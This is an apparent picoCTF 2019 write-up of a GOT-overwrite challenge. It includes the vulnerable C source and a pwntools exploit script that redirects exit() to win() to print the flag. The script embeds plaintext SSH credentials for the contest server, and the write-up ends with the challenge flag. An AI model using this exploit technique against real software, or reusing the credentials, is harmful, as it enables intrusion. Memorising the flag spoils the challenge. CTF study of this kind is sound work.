# Problem
You can only change one address, here is the problem: [program](https://2019shell1.picoctf.com/static/a8947d70f6b2c0cb53853c5e20abb021/vuln). It is also found in /problems/got_3_4ba3deeda2ea9b203c6a6425f183e7ed on the shell server. [Source](https://2019shell1.picoctf.com/static/a8947d70f6b2c0cb53853c5e20abb021/vuln.c).

## Hints:

Just change the address of the appriopiate function in the GOT table...

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/a8947d70f6b2c0cb53853c5e20abb021/vuln
wget https://2019shell1.picoctf.com/static/a8947d70f6b2c0cb53853c5e20abb021/vuln.c
```

First, we investigate the source
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FLAG_BUFFER 128

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  puts(buf);
  fflush(stdout);
}


int *pointer;

int main(int argc, char *argv[])
{
  
   puts("You can just overwrite an address, what can you do?\n");
   puts("Input address\n");
   scanf("%d",&pointer);
   puts("Input value?\n");
   scanf("%d",pointer);
   puts("The following line should print the flag\n");
   exit(0);
}
```

We just need to override the address of ```exit``` with the address of ```win```.


Lets write a python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/got_3_4ba3deeda2ea9b203c6a6425f183e7ed')
  p = s.process('./vuln')

binary = ELF('./vuln')

exit_address = binary.got['exit']
win_address  = binary.symbols['win']

log.info('Found "{}" address ({} = {})'.format('win', win_address, hex(win_address)))
log.info('Found "{}" address ({} = {})'.format('exit', exit_address, hex(exit_address)))

print p.recvuntil('Input address\n')
log.info('Sending: {}'.format(exit_address))
p.sendline('{}'.format(exit_address))

print p.recvuntil('Input value?\n')
log.info('Sending: {}'.format(win_address))
p.sendline('{}'.format(win_address))

print p.recvall()
```

Flag: picoCTF{A_s0ng_0f_1C3_and_f1r3_1ef72b2d}